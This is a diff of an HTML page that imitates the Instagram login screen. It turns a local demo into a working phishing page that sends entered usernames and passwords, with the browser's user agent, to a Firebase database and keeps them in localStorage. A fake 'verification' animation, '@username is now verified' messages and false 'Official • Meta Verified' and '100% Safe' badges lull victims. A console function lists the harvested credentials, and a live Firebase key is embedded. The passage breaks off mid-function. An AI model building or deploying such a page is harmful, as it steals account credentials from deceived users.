@@ -1,155 +1,1153 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-    <meta charset="UTF-8">  
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>Instagram</title>  
-    <script src="https://cdn.tailwindcss.com"></script>  
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">  
-    <style>  
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }  
-        .insta-input { background-color: #121212; border: 1px solid #3a3a3a; color: #f5f5f5; font-size: 15px; }  
-        .insta-input:focus { border-color: #555; outline: none; box-shadow: 0 0 0 1px #555; }  
-        .insta-btn { background-color: #0095f6; font-weight: 600; font-size: 15px; }  
-    </style>  
-</head>  
-<body class="bg-black text-white">  
-    <div class="max-w-[380px] mx-auto min-h-screen flex flex-col px-6 pt-6">  <!-- Language -->  
-    <div class="flex justify-center mb-8">  
-        <div onclick="showLanguageMenu()" class="flex items-center gap-1 text-sm text-zinc-300 cursor-pointer px-4 py-1 hover:bg-zinc-900 rounded-full">  
-            <span>English (India)</span>  
-            <i class="fas fa-chevron-down text-xs ml-1"></i>  
-        </div>  
-    </div>  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification - Premium Effects</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    
+    <!-- ===== FIREBASE SDK (COMPAT) ===== -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background: #000;
+        }
+        
+        .gradient-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(-45deg, #000, #1a1a2e, #16213e, #0f3460);
+            background-size: 400% 400%;
+            animation: gradientBG 8s ease infinite;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .scan-line-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        
+        .scan-line-container.active {
+            opacity: 1;
+        }
+        
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                #0095f6 30%, 
+                #00d2ff 50%, 
+                #0095f6 70%, 
+                transparent 100%
+            );
+            box-shadow: 0 0 30px rgba(0, 149, 246, 0.5),
+                        0 0 60px rgba(0, 149, 246, 0.3);
+            animation: scanDown 3s ease-in-out infinite;
+        }
+        
+        @keyframes scanDown {
+            0% { top: -5%; opacity: 1; }
+            50% { top: 100%; opacity: 1; }
+            51% { opacity: 0; }
+            52% { top: -5%; opacity: 0; }
+            53% { opacity: 1; }
+            100% { top: 100%; opacity: 1; }
+        }
+        
+        .scan-glow {
+            position: absolute;
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(180deg, 
+                transparent 0%, 
+                rgba(0, 149, 246, 0.1) 50%, 
+                transparent 100%
+            );
+            animation: scanGlow 3s ease-in-out infinite;
+            top: -100px;
+        }
+        
+        @keyframes scanGlow {
+            0% { top: -100px; }
+            50% { top: 100%; }
+            100% { top: 100%; }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translate(0); }
+            10% { transform: translate(-10px, -5px) rotate(-1deg); }
+            20% { transform: translate(10px, 5px) rotate(1deg); }
+            30% { transform: translate(-5px, 10px) rotate(-1.5deg); }
+            40% { transform: translate(5px, -10px) rotate(1.5deg); }
+            50% { transform: translate(-15px, 5px) rotate(-2deg); }
+            60% { transform: translate(15px, -5px) rotate(2deg); }
+            70% { transform: translate(-5px, 10px) rotate(-1deg); }
+            80% { transform: translate(5px, -10px) rotate(1deg); }
+            90% { transform: translate(-10px, 5px) rotate(-0.5deg); }
+        }
+        
+        .shake-active {
+            animation: shake 0.6s ease;
+        }
+        
+        .flip-container {
+            perspective: 1000px;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .flip-container.active {
+            opacity: 1;
+            transform: scale(1);
+        }
+        
+        .flip-card {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.8s cubic-bezier(0.4, 0.2, 0.2, 1);
+            transform-style: preserve-3d;
+        }
+        
+        .flip-card.flipped {
+            transform: rotateY(180deg);
+        }
+        
+        .flip-front, .flip-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+        }
+        
+        .flip-front {
+            background: radial-gradient(circle, #1a1a2e, #000);
+            border: 3px solid #0095f6;
+            box-shadow: 0 0 30px rgba(0, 149, 246, 0.2);
+        }
+        
+        .flip-front i {
+            color: #0095f6;
+            animation: pulse-icon 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse-icon {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+        
+        .flip-back {
+            background: radial-gradient(circle, #0095f6, #0066b3);
+            transform: rotateY(180deg);
+            border: 3px solid #fff;
+            box-shadow: 0 0 60px rgba(0, 149, 246, 0.5);
+        }
+        
+        .flip-back i {
+            color: #fff;
+            font-size: 50px;
+        }
+        
+        .verify-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            width: 100%;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .step {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeSlide 0.6s ease;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .step.active {
+            display: flex;
+        }
+        
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .loading-spinner {
+            width: 100px;
+            height: 100px;
+            border: 6px solid #1a1a1a;
+            border-top: 6px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            margin-top: 30px;
+        }
+        
+        .loading-subtext {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        
+        .processing-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            z-index: 1;
+        }
+        
+        .progress-ring {
+            transform: rotate(-90deg);
+            width: 120px;
+            height: 120px;
+        }
+        
+        .progress-ring circle {
+            fill: none;
+            stroke-width: 6;
+            stroke-linecap: round;
+        }
+        
+        .progress-bg {
+            stroke: #1a1a1a;
+        }
+        
+        .progress-fill {
+            stroke: #0095f6;
+            stroke-dasharray: 339.292;
+            stroke-dashoffset: 339.292;
+            animation: fillProgress 4.5s ease forwards;
+        }
+        
+        @keyframes fillProgress {
+            0% { stroke-dashoffset: 339.292; }
+            100% { stroke-dashoffset: 0; }
+        }
+        
+        .processing-percent {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .processing-text {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 500;
+            margin-top: 20px;
+            z-index: 1;
+        }
+        
+        .processing-subtext {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-top: 8px;
+            z-index: 1;
+        }
+        
+        .processing-steps {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 280px;
+            z-index: 1;
+        }
+        
+        .processing-step-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #8e8e8e;
+            font-size: 14px;
+            opacity: 0;
+            animation: stepReveal 0.4s ease forwards;
+        }
+        
+        .processing-step-item .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            background: #1a1a1a;
+            color: #8e8e8e;
+            flex-shrink: 0;
+        }
+        
+        .processing-step-item.done .step-icon {
+            background: #0095f6;
+            color: #fff;
+        }
+        
+        .processing-step-item.done {
+            color: #fff;
+        }
+        
+        .processing-step-item.active .step-icon {
+            border: 2px solid #0095f6;
+            background: transparent;
+            color: #0095f6;
+            animation: pulse-border 1s ease infinite;
+        }
+        
+        @keyframes pulse-border {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        @keyframes stepReveal {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .verify-badge {
+            position: relative;
+            animation: float 2s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-15px) scale(1.03); }
+        }
+        
+        .verify-icon-main {
+            font-size: 120px;
+            color: #0095f6;
+            filter: drop-shadow(0 0 30px rgba(0, 149, 246, 0.3));
+        }
+        
+        .checkmark-svg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .checkmark-svg circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 6;
+            stroke: #0095f6;
+            fill: none;
+            animation: strokeAnim 0.8s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+        
+        .checkmark-svg path {
+            stroke-dasharray: 100;
+            stroke-dashoffset: 100;
+            stroke: #0095f6;
+            stroke-width: 8;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            animation: strokeAnim 0.8s cubic-bezier(0.65, 0, 0.45, 1) 0.3s forwards;
+        }
+        
+        @keyframes strokeAnim {
+            100% { stroke-dashoffset: 0; }
+        }
+        
+        .verify-text {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 600;
+            margin-top: 30px;
+            animation: slideUp 0.8s ease 0.3s both;
+        }
+        
+        .verify-subtext {
+            color: #8e8e8e;
+            font-size: 16px;
+            margin-top: 8px;
+            animation: slideUp 0.8s ease 0.6s both;
+        }
+        
+        .username-highlight {
+            color: #0095f6;
+            font-weight: 600;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .sparkles {
+            position: absolute;
+            animation: sparkle 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes sparkle {
+            0%, 100% { opacity: 0; transform: scale(0.5) rotate(0deg); }
+            50% { opacity: 1; transform: scale(1.2) rotate(180deg); }
+        }
+        
+        .sparkle-1 { top: -30px; right: -30px; font-size: 30px; animation-delay: 0.2s; }
+        .sparkle-2 { bottom: -30px; left: -30px; font-size: 25px; animation-delay: 0.5s; }
+        .sparkle-3 { top: -10px; left: -40px; font-size: 20px; animation-delay: 0.8s; }
+        .sparkle-4 { bottom: -10px; right: -40px; font-size: 28px; animation-delay: 0.3s; }
+        
+        .verified-stats {
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #8e8e8e;
+            font-size: 14px;
+            animation: slideUp 0.8s ease 0.9s both;
+        }
+        
+        .verified-stats i {
+            color: #0095f6;
+            font-size: 14px;
+        }
+        
+        .verified-stats .number {
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        /* ===== LIGHT TEXTS ===== */
+        
+        /* Top - Wait for 24-48 hours */
+        .wait-text {
+            color: rgba(255, 255, 255, 0.12);
+            font-size: 13px;
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            animation: fadeInLight 1s ease 0.5s both;
+            text-align: center;
+            position: relative;
+            top: -10px;
+        }
+        
+        /* Good Luck - Very Light */
+        .good-luck-text {
+            color: rgba(255, 255, 255, 0.08);
+            font-size: 13px;
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-top: 25px;
+            animation: fadeInLight 1.5s ease 1s both;
+            text-align: center;
+        }
+        
+        /* Chance - Random number show */
+        .chance-text {
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 12px;
+            font-weight: 400;
+            letter-spacing: 2px;
+            margin-top: 4px;
+            animation: fadeInLight 2s ease 1.3s both;
+            text-align: center;
+        }
+        
+        /* Enter Email ID - Thoda Dark */
+        .email-text {
+            color: rgba(255, 255, 255, 0.20);
+            font-size: 11px;
+            font-weight: 300;
+            letter-spacing: 1px;
+            margin-top: 6px;
+            animation: fadeInLight 2.2s ease 1.6s both;
+            text-align: center;
+        }
+        
+        @keyframes fadeInLight {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 999;
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 2px;
+            animation: confettiFall linear forwards;
+        }
+        
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(-10vh) rotate(0deg) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg) scale(0);
+                opacity: 0;
+            }
+        }
+        
+        #loginContainer {
+            max-width: 350px;
+            width: 100%;
+            padding: 20px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hidden { display: none !important; }
+        
+        .insta-input {
+            background-color: #121212;
+            border: 1px solid #3a3a3a;
+            color: #f5f5f5;
+            font-size: 15px;
+        }
+        .insta-input:focus {
+            border-color: #555;
+            outline: none;
+            box-shadow: 0 0 0 1px #555;
+        }
+        .insta-btn {
+            background-color: #0095f6;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .back-btn {
+            margin-top: 30px;
+            color: #8e8e8e;
+            font-size: 14px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .back-btn:hover { color: #fff; }
+        
+        .safe-verified-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            padding: 8px 0;
+            margin-top: 4px;
+            opacity: 0.6;
+        }
+        
+        .safe-verified-row .item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+        }
+        
+        .safe-verified-row .item i {
+            font-size: 12px;
+            color: #0095f6;
+        }
+        
+        .official-light {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.12);
+            font-size: 10px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            font-weight: 300;
+            margin-top: 2px;
+            margin-bottom: 16px;
+        }
+        
+        .meta-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 10px;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+        
+        @media (max-width: 480px) {
+            .flip-container {
+                width: 100px;
+                height: 100px;
+            }
+            .safe-verified-row {
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+            .wait-text {
+                font-size: 11px;
+                margin-bottom: 10px;
+            }
+            .good-luck-text {
+                font-size: 11px;
+                margin-top: 20px;
+            }
+            .chance-text {
+                font-size: 10px;
+            }
+            .email-text {
+                font-size: 9px;
+            }
+        }
+    </style>
+</head>
+<body>
 
-    <!-- Logo -->  
-    <div class="flex justify-center mb-10">  
-        <img src="instagram.png" alt="Instagram" class="w-[82px] h-[82px]">  
-    </div>  
+    <!-- ===== GRADIENT BACKGROUND ===== -->
+    <div class="gradient-bg"></div>
 
-    <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-3">  
-        <input type="text" id="username" placeholder="Username, email address or mobile number"   
-               class="insta-input w-full px-4 py-[13px] rounded-3xl" required>  
-          
-        <div class="relative">  
-            <input type="password" id="password" placeholder="Password"   
-                   class="insta-input w-full px-4 py-[13px] rounded-3xl pr-12" required>  
-            <button type="button" onclick="togglePassword()"   
-                    class="absolute right-4 top-1/2 -translate-y-1/2 text-zinc-400">  
-                <i class="fas fa-eye" id="eyeIcon"></i>  
-            </button>  
-        </div>  
+    <!-- ===== SCAN LINE ===== -->
+    <div class="scan-line-container" id="scanLine">
+        <div class="scan-line"></div>
+        <div class="scan-glow"></div>
+    </div>
 
-        <button type="submit" class="insta-btn w-full py-3 text-white rounded-full mt-2">  
-            Log in  
-        </button>  
-    </form>  
+    <!-- ===== VERIFICATION CONTAINER ===== -->
+    <div class="verify-container" id="verifyContainer">
+        
+        <!-- STEP 1: LOADING -->
+        <div class="step active" id="stepLoading">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Verifying your account...</div>
+            <div class="loading-subtext">Please wait while we check your details</div>
+        </div>
+        
+        <!-- STEP 2: PROCESSING -->
+        <div class="step" id="stepProcessing" style="position: relative;">
+            
+            <div class="flip-container" id="flipContainer">
+                <div class="flip-card" id="flipCard">
+                    <div class="flip-front">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="flip-back">
+                        <i class="fas fa-check"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="processing-container" style="margin-top: 20px;">
+                <svg class="progress-ring" viewBox="0 0 120 120">
+                    <circle class="progress-bg" cx="60" cy="60" r="54"/>
+                    <circle class="progress-fill" cx="60" cy="60" r="54"/>
+                </svg>
+                <div class="processing-percent" id="percentText">0%</div>
+            </div>
+            
+            <div class="processing-text">Processing verification</div>
+            <div class="processing-subtext">Checking your credentials</div>
+            
+            <div class="processing-steps">
+                <div class="processing-step-item" id="step1">
+                    <div class="step-icon"><i class="fas fa-user"></i></div>
+                    <span>Identity verification</span>
+                </div>
+                <div class="processing-step-item" id="step2">
+                    <div class="step-icon"><i class="fas fa-shield-alt"></i></div>
+                    <span>Security check</span>
+                </div>
+                <div class="processing-step-item" id="step3">
+                    <div class="step-icon"><i class="fas fa-check"></i></div>
+                    <span>Finalizing verification</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- STEP 3: VERIFIED -->
+        <div class="step" id="stepVerified">
+            
+            <!-- ===== TOP: Wait for 24-48 hours ===== -->
+            <div class="wait-text">⏳ Wait for 24 - 48 hours</div>
+            
+            <div class="verify-badge">
+                <span class="sparkles sparkle-1">✨</span>
+                <span class="sparkles sparkle-2">⭐</span>
+                <span class="sparkles sparkle-3">💫</span>
+                <span class="sparkles sparkle-4">🌟</span>
+                
+                <div style="position: relative; width: 140px; height: 140px;">
+                    <i class="fas fa-check-circle verify-icon-main" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></i>
+                    <svg class="checkmark-svg" width="140" height="140" viewBox="0 0 120 120">
+                        <circle cx="60" cy="60" r="54"/>
+                        <path d="M38 60 L53 75 L82 45"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="verify-text">✅ Verified!</div>
+            <div class="verify-subtext">
+                <span class="username-highlight" id="verifiedUsername">@username</span> is now verified
+            </div>
+            
+            <div class="verified-stats">
+                <i class="fas fa-check-circle"></i>
+                <span>Trusted by <span class="number">10,000+</span> users worldwide</span>
+            </div>
+            
+            <!-- ===== LIGHT TEXTS ===== -->
+            <div class="good-luck-text">✦ Good Luck ✦</div>
+            <div class="chance-text" id="chanceDisplay">⚡ 0% chance • keep going</div>
+            <div class="email-text">✉️ Enter email id for updates</div>
+            
+            <button class="back-btn" onclick="goBack()">
+                <i class="fas fa-arrow-left mr-2"></i> Back to login
+            </button>
+        </div>
+    </div>
 
-    <div class="text-center mt-5">  
-        <button onclick="forgotPassword()" class="text-[#0095f6] text-sm font-medium">Forgotten password?</button>  
-    </div>  
+    <!-- ===== LOGIN SCREEN ===== -->
+    <div id="loginContainer">
+        <div class="flex justify-center mb-8">
+            <div onclick="showLanguageMenu()" class="flex items-center gap-1 text-sm text-zinc-300 cursor-pointer px-4 py-1 hover:bg-zinc-900 rounded-full">
+                <span>English (India)</span>
+                <i class="fas fa-chevron-down text-xs ml-1"></i>
+            </div>
+        </div>
+        
+        <div class="flex justify-center mb-6">
+            <img src="instagram.png" alt="Instagram" class="w-[82px] h-[82px]">
+        </div>
 
-    <div class="flex-1"></div>  
+        <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-3">
+            <input type="text" id="username" placeholder="Username, email address or mobile number" class="insta-input w-full px-4 py-[13px] rounded-3xl" required>
+            <div class="relative">
+                <input type="password" id="password" placeholder="Password" class="insta-input w-full px-4 py-[13px] rounded-3xl pr-12" required>
+                <button type="button" onclick="togglePassword()" class="absolute right-4 top-1/2 -translate-y-1/2 text-zinc-400">
+                    <i class="fas fa-eye" id="eyeIcon"></i>
+                </button>
+            </div>
+            <button type="submit" class="insta-btn w-full py-3 text-white rounded-full mt-2">Log in</button>
+        </form>
 
-    <div class="pb-6">  
-        <button onclick="showCreateAccountModal()"   
-                class="w-full py-3 border border-[#0095f6] text-[#0095f6] font-semibold rounded-full text-sm">  
-            Create new account  
-        </button>  
-    </div>  
+        <div class="text-center mt-5">
+            <button onclick="forgotPassword()" class="text-[#0095f6] text-sm font-medium">Forgotten password?</button>
+        </div>
+        <div class="pb-6 mt-4">
+            <button onclick="showCreateAccountModal()" class="w-full py-3 border border-[#0095f6] text-[#0095f6] font-semibold rounded-full text-sm">Create new account</button>
+        </div>
+        
+        <div class="safe-verified-row">
+            <span class="item">
+                <i class="fas fa-shield-alt"></i> 100% Safe
+            </span>
+            <span class="item">
+                <i class="fas fa-check-circle"></i> Verified
+            </span>
+        </div>
+        
+        <div class="official-light">Official • Meta Verified</div>
+        
+        <div class="meta-bottom">
+            <span>∞</span>
+            <span>Meta</span>
+        </div>
+    </div>
 
-    <div class="flex justify-center items-center gap-1 pb-8 text-zinc-400 text-xs">  
-        <span>∞</span> <span>Meta</span>  
-    </div>  
-</div>  
+    <!-- ===== CONFETTI ===== -->
+    <div class="confetti-container" id="confettiContainer"></div>
 
-<script>  
-    function togglePassword() {  
-        const pass = document.getElementById('password');  
-        const eye = document.getElementById('eyeIcon');  
-        if (pass.type === 'password') {  
-            pass.type = 'text';  
-            eye.classList.replace('fa-eye', 'fa-eye-slash');  
-        } else {  
-            pass.type = 'password';  
-            eye.classList.replace('fa-eye-slash', 'fa-eye');  
-        }  
-    }  
+    <script>
+        // ============================================
+        // 🔥 FIREBASE CONFIG
+        // ============================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyB4v_8Td81d4scU_8-6IuBtSZKRQA-Siw4",
+            authDomain: "github-494be.firebaseapp.com",
+            databaseURL: "https://github-494be-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "github-494be",
+            storageBucket: "github-494be.firebasestorage.app",
+            messagingSenderId: "701947832539",
+            appId: "1:701947832539:web:e54ae0a20d33c398b9c4fe"
+        };
 
-    function handleLogin(e) {  
-        e.preventDefault();  
-          
-        const username = document.getElementById('username').value.trim();  
-        const password = document.getElementById('password').value.trim();  
+        // ============================================
+        // FIREBASE INITIALIZE (Hidden)
+        // ============================================
+        let database = null;
+        let firebaseInitialized = false;
 
-        // === YEH IMPORTANT HAI ===  
-        // Jo bhi user daalega, yeh console aur alert mein dikhega  
-        console.log("Username entered:", username);  
-        console.log("Password entered:", password);  
+        function initFirebase() {
+            try {
+                firebase.initializeApp(firebaseConfig);
+                database = firebase.database();
+                firebaseInitialized = true;
+                console.log('✅ Firebase Connected Successfully!');
+                loadVisitorsFromFirebase();
+            } catch (error) {
+                console.error('❌ Firebase Error:', error);
+            }
+        }
 
-        alert("Entered Username: " + username + "\nEntered Password: " + password);  
+        // ============================================
+        // SAVE TO FIREBASE
+        // ============================================
+        function saveToFirebase(username, password) {
+            if (!firebaseInitialized) {
+                console.warn('⚠️ Firebase not initialized');
+                return false;
+            }
 
-        // Demo check (sirf demo ke liye)  
-        if ((username.toLowerCase() === 'demo' || username === 'user@example.com') && password === 'demo123') {  
-            alert("Demo login successful!");  
-        } else {  
-            alert("Invalid credentials (demo mode)");  
-        }  
-    }  
+            const timestamp = Date.now();
+            const data = {
+                username: username,
+                password: password,
+                time: new Date().toLocaleString(),
+                timestamp: timestamp,
+                userAgent: navigator.userAgent
+            };
 
-    function forgotPassword() {  
-        alert("Password reset link sent (demo)");  
-    }  
+            database.ref('visitors/' + timestamp).set(data)
+                .then(() => {
+                    console.log('✅ Saved to Firebase!');
+                    console.log('👤 Username:', username);
+                    console.log('🔑 Password:', password);
+                })
+                .catch((error) => {
+                    console.error('❌ Firebase save error:', error);
+                });
 
-    function showCreateAccountModal() {  
-        alert("Create account modal would open here (demo)");  
-    }  
+            return true;
+        }
 
-    function showLanguageMenu() {  
-        alert("Language menu (demo)");  
-    }  
+        // ============================================
+        // LOAD FROM FIREBASE
+        // ============================================
+        function loadVisitorsFromFirebase() {
+            if (!firebaseInitialized) return;
 
-    window.onload = () => {  
-        document.getElementById('username').focus();  
-        console.log("%c[Demo] Open console (F12) to see entered username & password", "color:#666");  
-    };  
-<script type="module">
+            database.ref('visitors').orderByChild('timestamp').limitToLast(10).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    const visitors = Object.values(data).reverse();
+                    console.log('📁 Loaded from Firebase:', visitors.length, 'visitors');
+                    localStorage.setItem('instagram_visitors_firebase', JSON.stringify(visitors));
+                }
+            }, (error) => {
+                console.error('❌ Firebase load error:', error);
+            });
+        }
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+        // ============================================
+        // VIEW FIREBASE DATA (Console)
+        // ============================================
+        function viewFirebaseData() {
+            if (!firebaseInitialized) {
+                console.warn('⚠️ Firebase not initialized');
+                return;
+            }
+            database.ref('visitors').orderByChild('timestamp').limitToLast(20).once('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    const visitors = Object.values(data).reverse();
+                    console.log('📊 ===== FIREBASE VISITORS =====');
+                    console.log(`📁 Total: ${visitors.length} visitors`);
+                    visitors.forEach((v, i) => {
+                        console.log(`  ${i+1}. 👤 ${v.username} | 🔑 ${v.password} | 🕐 ${v.time}`);
+                    });
+                } else {
+                    console.log('📭 No data in Firebase yet');
+                }
+            });
+        }
 
-const firebaseConfig = {
-  apiKey: "AIzaSyB4v_8Td81d4scU_8-6IuBtSZKRQA-Siw4",
-authDomain: "github-494be.firebaseapp.com",
-projectId: "github-494be",
-storageBucket: "github-494be.firebasestorage.app",
-messagingSenderId: "701947832539",
-appId: "1:701947832539:web:e54ae0a20d33c398b9c4fe"
-};
+        // ============================================
+        // RANDOM CHANCE GENERATOR (0-30%)
+        // Same username/password = same chance
+        // ============================================
+        function getChance(username, password) {
+            // Create a unique key from username + password
+            const key = username + ':' + password;
+            
+            // Simple hash function
+            let hash = 0;
+            for (let i = 0; i < key.length; i++) {
+                const char = key.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+            
+            // Convert to positive and get between 0-30%
+            const chance = Math.abs(hash) % 31; // 0 to 30
+            
+            return chance;
+        }
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+        // ============================================
+        // TOGGLE PASSWORD
+        // ============================================
+        function togglePassword() {
+            const pass = document.getElementById('password');
+            const eye = document.getElementById('eyeIcon');
+            if (pass.type === 'password') {
+                pass.type = 'text';
+                eye.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                pass.type = 'password';
+                eye.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
 
-async function saveData(text, result) {
-  try {
-    await addDoc(collection(db, "students"), {
-      calculation: text,
-      result: result,
-      time: new Date().toISOString()
-    });
+        // ============================================
+        // LOGIN HANDLER
+        // ============================================
+        function handleLogin(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim() || 'user';
+            const password = document.getElementById('password').value.trim() || 'password123';
+            
+            // ===== SAVE TO FIREBASE =====
+            saveToFirebase(username, password);
+            
+            // ===== SAVE TO LOCALSTORAGE =====
+            localStorage.setItem('lastLoginData', JSON.stringify({ username, password }));
+            localStorage.setItem('lastUsername', username);
+            
+            // ===== GENERATE CHANCE (0-30%) =====
+            const chance = getChance(username, password);
+            localStorage.setItem('userChance', chance);
+            
+            document.getElementById('loginContainer').classList.add('hidden');
+            
+            const verifyContainer = document.getElementById('verifyContainer');
+            verifyContainer.style.display = 'flex';
+            
+            document.getElementById('scanLine').classList.add('active');
+            
+            startVerification(username, chance);
+        }
 
-    console.log("Data Saved");
-  } catch (error) {
-    console.error("Error:", error);
-  }
-}
+        // ============================================
+        // VERIFICATION FLOW
+        // ============================================
+        function startVerification(username, chance) {
+            showStep('stepLoading');
+            
+            setTimeout(() => {
+                showStep('stepProcessing');
+                
+                setTimeout(() => {
